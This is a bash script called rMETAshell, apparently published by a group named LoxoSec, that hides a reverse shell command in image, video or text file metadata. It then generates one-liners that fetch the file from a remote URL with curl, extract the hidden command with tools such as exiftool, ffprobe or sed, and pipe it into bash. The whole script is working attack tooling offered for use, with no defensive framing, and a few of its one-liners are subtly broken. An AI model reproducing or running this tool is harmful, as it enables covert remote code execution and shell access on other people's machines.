#!/bin/bash
#
# Ver. Sat/Sept/30/2023
#-------------------------------------------------
#
# From: LoxoSec with ❤️
#
# rMETAshell - A reverse shell metadata injection
# and one-liner generator tool!
#
# git5
# ------------------------------------------------
# Github
# https://github.com/git5loxosec
# ------------------------------------------------
# Website
# https://www.LoxoSec.rf.gd
# ------------------------------------------------
# Whatsapp group (Latin/Hispanic/International)
# https://chat.whatsapp.com/Iv7lplJVgM16FeuIzKhFxj
# ------------------------------------------------
# X
# https://x.com/git5loxosec
# ------------------------------------------------
# Facebook
# https://www.facebook.com/profile.php?id=61551530174528
# ------------------------------------------------

show_help() {
    echo -e "\e[36mUsage: $0 [OPTIONS] <REVERSE_SHELL_COMMAND> <filename> <URL>\e[0m"
    echo -e "\e[36mInject a reverse shell command into a file, generate a one-liner execution method, and upload the file.\e[0m"
    echo ""
    echo -e "\e[36mOptions:\e[0m"
    echo "  -h, --help           Display this help message."
    echo ""
    echo -e "\e[36mArguments:\e[0m"
    echo -e "\e[36m  <REVERSE_SHELL_COMMAND> The reverse shell command to inject.\e[0m"
    echo -e "\e[36m  <filename>            The name of the file.\e[0m"
    echo -e "\e[36m  <URL>                 The URL path to upload the file (e.g., http://www.example.com).\e[0m"
    echo ""
}

contains_element() {
    local element="$1"
    local list=($2) 
    for item in "${list[@]}"; do
        if [ "$element" == "$item" ]; then
            return 0  
        fi
    done
    return 1  
}

media_compat_file="db/media_compatibility.txt"
text_compat_file="db/text_compatibility.txt"

if [ -f "$media_compat_file" ]; then
    media_compatibility=$(<"$media_compat_file")
else
    echo -e "\e[91mError: Media compatibility file '$media_compat_file' not found.\e[0m"
    exit 1
fi

if [ -f "$text_compat_file" ]; then
    text_compatibility=$(<"$text_compat_file")
else
    echo -e "\e[91mError: Text compatibility file '$text_compat_file' not found.\e[0m"
    exit 1
fi

if [ "$1" == "-h" ] || [ "$1" == "--help" ]; then
    show_help
    exit 0
fi

if [ $# -ne 3 ]; then
    echo -e "\e[91mError: Invalid number of arguments.\e[0m"
    show_help
    exit 1
fi

command="$1"
filename="$2"
url="$3"

file_extension="${filename##*.}"

if contains_element "$file_extension" "$media_compatibility"; then
    echo -e "\e[95mInjecting reverse shell into media file...\e[0m"
    echo "Executing: exiftool -Comment=\"$command\" \"$filename\""
    exiftool -Comment="$command" "$filename"
    echo -e "\e[95mMedia file command injection method completed.\e[0m"
elif contains_element "$file_extension" "$text_compatibility"; then
    echo -e "\e[95mInjecting reverse shell into text file...\e[0m"
    echo "<rs>$command</rs>" >> "$filename"
    echo -e "\e[95mText-based file command injection method completed.\e[0m"
else
    allowed_extensions=("zip" "rar")  

    if contains_element "$file_extension" "${allowed_extensions[*]}"; then
        echo -e "\e[36mWarning: The file extension '$file_extension' is not in the compatibility lists but is allowed.\e[0m"
    else
        echo -e "\e[91mError: File extension not supported.\e[0m"
        show_help
        exit 1
    fi
fi

echo -e "\e[36mSelect a one-liner method:\e[0m"
echo -e "\e[36mExecution methods compatible with image file format:\e[0m"
echo "1. image-exiftool-one-liner"
echo "2. image-exiv2-one-liner"
echo "3. image-identify-one-liner"
echo "4. image-file-grep-one-liner"

echo -e "\e[36mExecution methods compatible with video file format:\e[0m"
echo "5. video-exiftool-one-liner"
echo "6. video-ffprobe-one-liner"

echo -e "\e[36mExecution methods compatible with text file format:\e[0m"
echo "7. text-sed-one-liner"
echo -e "\e[36mExecution method for an infected image/video saved in a zip:\e[0m"
echo "8. image/video-exiftool-zip-one-liner"
read -p "Enter the method number (1-8): " method_choice

case "$method_choice" in
    1)
        echo -e "\e[37mGenerating one-liner method with exiftool..."
        one_liner="curl -s '$url/$filename' | exiftool -Comment -b - | bash"
        echo -e "Generated one-liner:\n\e[32m$one_liner\e[0m"
        ;;
    2)
        echo -e "\e[37mGenerating one-liner method with exiv2..."
        one_liner="curl -s '$url/$filename' -o $filename | exiv2 -p c $filename | bash"
        echo -e "Generated one-liner:\n\e[32m$one_liner\e[0m"
        ;;
    3)
        echo -e "\e[37mGenerating one-liner method with identify..."
        one_liner="curl -s '$url/$filename' | identify -format '%c' - | bash"
        echo -e "Generated one-liner:\n\e[32m$one_liner\e[0m"
        ;;
    4)
        echo -e "\e[37mGenerating one-liner method with file and grep..."
        one_liner="curl -s '$url/$filename' | file - | grep -oP 'comment: "\K[^"]*' | bash"
        echo -e "Generated one-liner:\n\e[32m$one_liner\e[0m"
        ;;
    5)
        echo -e "\e[37mGenerating one-liner method with exiftool..."
        one_liner="curl -s '$url/$filename' | exiftool -Comment -b - | bash"
        echo -e "Generated one-liner:\n\e[32m$one_liner\e[0m"
        ;;
    6)
        echo -e "\e[37mGenerating one-liner method with ffprobe..."
        one_liner="curl -s '$url/$filename' -o $filename | ffprobe $filename -v error -show_entries format_tags=comment -of default=nw=1:nk=1 | bash"
        echo -e "Generated one-liner:\n\e[32m$one_liner\e[0m"
        ;;
    7)
        echo -e "\e[37mGenerating one-liner method with sed for text based files..."
        one_liner="curl -s '$url/$filename' | sed 's#<rs>##g' | sed 's#</rs>##' | bash"
        echo -e "Generated one-liner:\n\e[32m$one_liner\e[0m"
        ;;
    8)
        echo -e "\e[37mGenerating one-liner method with exiftool for extracting the reverse shell injected on the image/video file..."
        read -p "Enter the name of the file inside the ZIP archive: " filename2
        one_liner="curl -s '$url/$filename' -o $filename && unzip -p x.zip $filename2 > $filename2 && exiftool -Comment -b $filename2 | bash && rm $filename2"
        echo -e "Generated one-liner:\n\e[32m$one_liner\e[0m"
        ;;
    *)
        echo -e "\e[91mError: Invalid method number.\e[0m"
        exit 1
        ;;
esac

echo -e "\e[37mOne-liner method execution completed.\e[0m"
